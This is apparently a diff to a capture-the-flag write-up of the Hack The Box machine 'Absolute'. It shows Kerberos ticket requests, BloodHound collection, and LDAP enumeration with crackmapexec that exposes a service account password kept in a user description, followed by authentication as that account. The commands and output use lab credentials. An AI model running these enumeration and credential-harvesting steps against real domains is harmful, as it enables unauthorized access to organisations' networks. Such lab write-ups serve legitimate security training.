@@ -114,7 +114,7 @@ SMB         10.129.229.59   445    DC               SYSVOL          READ        
 ```
 
 ##### Method 2, impacket-getTGT
-I'd perfer it since it doesn't need to make configurations.
+I'd perfer it since it doesn't need to make configurations. Although, it requires to know the `-dc-ip`
 
 ```bash
 impacket-getTGT absolute.htb/d.klay:Darkmoonsky248girl -dc-ip dc.absolute.htb
@@ -131,4 +131,79 @@ faketime '2023-11-20 17:50:00' crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248
 SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
 SMB         10.129.229.59   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
 SMB         10.129.229.59   445    DC               [+] Enumerated shares
+```
+
+### Bloodbound-python
+It requires adding `nameserver Victim's DC_IP 10.129.229.59`
+
+```bash
+faketime '2023-11-20 18:49:00' bloodhound-python -u d.klay -p 'Darkmoonsky248girl' -k -d absolute.htb -dc dc.absolute.htb
+INFO: Found AD domain: absolute.htb
+INFO: Using TGT from cache
+INFO: Found TGT with correct principal in ccache file.
+INFO: Connecting to LDAP server: dc.absolute.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Found 18 users
+INFO: Connecting to LDAP server: dc.absolute.htb
+INFO: Found 55 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc.absolute.htb
+INFO: Done in 00M 23S
+```
+
+# Auth as svc_smb
+### Method 1, ldapsearch
+Annonying part:
+
+```bash
+faketime '2023-11-20 19:00:00' ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb"
+SASL/GSSAPI authentication started
+ldap_sasl_interactive_bind: Local error (-2)
+        additional info: SASL(-1): generic failure: GSSAPI Error: No credentials were supplied, or the credentials were unavailable or inaccessible (No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_1000))
+        ```
+
+To fix this, make sure that `dc.absolute.htb` comes before `absolute.htb` in `/etc/hosts`. That’s because Kerberos is doing a reverse lookup on the IP to get the server name. My OS checks the hosts file, and gets the first host with that IP. Then when it tries to look up that host (absolute.htb) in the Kerberos DB, it doesn’t find one, and returns Server not found in Kerberos database. Props to Ippsec for figuring this out - * https://www.youtube.com/watch?v=rfAmMQV_wss&t=34m45s
+
+```bash
+faketime '2023-11-20 19:08:00' ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb"
+faketime '2023-11-20 19:08:00' ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb" 'user'
+faketime '2023-11-20 19:08:00' ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb" 'user' 'description'
+
+# svc_smb, Users, absolute.htb
+dn: CN=svc_smb,CN=Users,DC=absolute,DC=htb
+description: AbsoluteSMBService123!
+```
+
+##### Method 2, CME
+It's better
+
+```bash
+faketime '2023-11-20 19:14:00' crackmapexec ldap $IP -u d.klay -p 'Darkmoonsky248girl' -k --users
+SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+LDAP        10.129.229.59   389    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
+LDAP        10.129.229.59   389    DC               [*] Total of records returned 20
+LDAP        10.129.229.59   389    DC               Administrator                  Built-in account for administering the computer/domain
+LDAP        10.129.229.59   389    DC               Guest                          Built-in account for guest access to the computer/domain
+LDAP        10.129.229.59   389    DC               krbtgt                         Key Distribution Center Service Account
+LDAP        10.129.229.59   389    DC               J.Roberts                      
+LDAP        10.129.229.59   389    DC               M.Chaffrey                     
+LDAP        10.129.229.59   389    DC               D.Klay                         
+LDAP        10.129.229.59   389    DC               s.osvald                       
+LDAP        10.129.229.59   389    DC               j.robinson                     
+LDAP        10.129.229.59   389    DC               n.smith                        
+LDAP        10.129.229.59   389    DC               m.lovegod                      
+LDAP        10.129.229.59   389    DC               l.moore                        
+LDAP        10.129.229.59   389    DC               c.colt                         
+LDAP        10.129.229.59   389    DC               s.johnson                      
+LDAP        10.129.229.59   389    DC               d.lemm                         
+LDAP        10.129.229.59   389    DC               svc_smb                        AbsoluteSMBService123!
+LDAP        10.129.229.59   389    DC               svc_audit                      
+LDAP        10.129.229.59   389    DC               winrm_user                     Used to perform simple network tasks
+
+faketime '2023-11-20 19:16:00' crackmapexec smb $IP -u svc_smb -p 'AbsoluteSMBService123!' -k
+SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         10.129.229.59   445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123!
 ```
